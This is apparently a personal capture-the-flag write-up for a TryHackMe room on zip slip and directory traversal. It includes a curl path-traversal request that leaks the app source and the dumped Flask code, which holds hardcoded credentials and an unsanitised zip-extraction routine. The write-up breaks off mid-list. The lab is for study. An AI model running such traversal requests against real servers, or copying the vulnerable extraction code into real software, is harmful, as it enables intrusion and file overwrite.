# URL
https://tryhackme.com/room/hh-thehollowshell-ddb582ac
# Concept
* file upload attack
* directory traversal
* zip slip vulnerability
# Method of solve
* the web app for this challenge is on port `5000`
* there are credentials in the HTTP source comments
  * we use those credentials to login
* the app wants us to include a `shell.json` file in an zip file for upload, but we can upload other files in the zip as well
* the minimum acceptable contents of the `shell.json` file are:
```
{
  "name":"zip slip"
}
```
* we need to zip this up to upload it:
```Bash
zip exploit.zip shell.json
```
* after upload, we see the location to which it is uploaded: `/shell/<random_alphanumeric>/`
* this app is vulnerable to a `directory traversal` attack, which we can leverage with `Curl`:
  * from the HTTP response headers from the app, this is a `Gunicorn` app, which typically uses the file `app.py` to run the app
```Bash
curl --path-as-is http://10.146.164.64:5000/shells/../app.py
```
* this returns the code for the entire app, and gives us a lot of information
```Python
#!/usr/bin/env python3

import os
import io
import json
import uuid
import zipfile

from flask import (
    Flask, request, session, redirect, url_for,
    render_template, send_from_directory, abort, flash
)

BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
SHELLS_DIR = os.path.join(BASE_DIR, "shells")
HOOKS_DIR  = os.path.join(BASE_DIR, "hooks")
os.makedirs(SHELLS_DIR, exist_ok=True)
os.makedirs(HOOKS_DIR, exist_ok=True)

ALLOWED_ASSET_EXT = {".png", ".jpg", ".jpeg", ".gif", ".svg", ".css", ".json"}

STAFF_USER = "concierge"
STAFF_PASS = "StayNoticed2024!"

app = Flask(__name__)
app.secret_key = "b1c4f9d2e7a83056-shoreline-display-conch"
app.config["MAX_CONTENT_LENGTH"] = 8 * 1024 * 1024


# Helpers
def logged_in():
    return session.get("staff") == STAFF_USER


def validate_manifest(manifest):
    """Validate the *declared* asset list. Raises ValueError on a bad type."""
    if not isinstance(manifest, dict):
        raise ValueError("shell.json must be a JSON object")
    name = manifest.get("name")
    if not name or not isinstance(name, str):
        raise ValueError("shell.json is missing a 'name'")
    assets = manifest.get("assets", [])
    if not isinstance(assets, list):
        raise ValueError("'assets' must be a list")
    for asset in assets:
        ext = os.path.splitext(str(asset))[1].lower()
        if ext not in ALLOWED_ASSET_EXT:
            raise ValueError(f"asset type not allowed: {asset}")
    return name


def extract_shell(zf, shell_dir):
    os.makedirs(shell_dir, exist_ok=True)
    written = []
    for name in zf.namelist():
        if name.endswith("/"):
            continue
        dest = os.path.join(shell_dir, name)
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "wb") as fh:
            fh.write(zf.read(name))
        written.append(name)
    return written


@app.route("/")
def index():
    return redirect(url_for("dashboard") if logged_in() else url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if u == STAFF_USER and p == STAFF_PASS:
            session["staff"] = u
            return redirect(url_for("dashboard"))
        flash("Those credentials weren't recognised. Try again.")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/dashboard")
def dashboard():
    if not logged_in():
        return redirect(url_for("login"))
    shells = []
    for entry in sorted(os.listdir(SHELLS_DIR)):
        meta_path = os.path.join(SHELLS_DIR, entry, "shell.json")
        label = entry
        if os.path.isfile(meta_path):
            try:
                with open(meta_path) as fh:
                    label = json.load(fh).get("name", entry)
            except Exception:
                pass
        shells.append({"id": entry, "name": label})
    return render_template("dashboard.html", shells=shells, user=session["staff"])


@app.route("/upload", methods=["POST"])
def upload():
    if not logged_in():
        return redirect(url_for("login"))

    file = request.files.get("shell")
    if not file or not file.filename:
        flash("No shell selected.")
        return redirect(url_for("dashboard"))

    raw = file.read()
    try:
        zf = zipfile.ZipFile(io.BytesIO(raw))
    except zipfile.BadZipFile:
        flash("That doesn't look like a shell (.zip expected).")
        return redirect(url_for("dashboard"))

    try:
        manifest = json.loads(zf.read("shell.json"))
    except KeyError:
        flash("Shell is missing shell.json.")
        return redirect(url_for("dashboard"))
    except (json.JSONDecodeError, UnicodeDecodeError):
        flash("shell.json could not be parsed.")
        return redirect(url_for("dashboard"))

    try:
        shell_name = validate_manifest(manifest)
    except ValueError as exc:
        flash(f"Shell rejected: {exc}")
        return redirect(url_for("dashboard"))

    shell_id  = uuid.uuid4().hex[:12]
    shell_dir = os.path.join(SHELLS_DIR, shell_id)
    extract_shell(zf, shell_dir)

    flash(f"Shell '{shell_name}' brought ashore. "
          f"Stored at shells/{shell_id}/ and held to the room's ear.")
    return redirect(url_for("dashboard"))


@app.route("/shells/<shell_id>/<path:asset>")
def shell_asset(shell_id, asset):
    """Serve a published shell's assets back to the in-room tablets (static bytes only)."""
    shell_dir = os.path.join(SHELLS_DIR, shell_id)
    if not os.path.isdir(shell_dir):
        abort(404)
    return send_from_directory(shell_dir, asset)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```
* some important details include:
* 
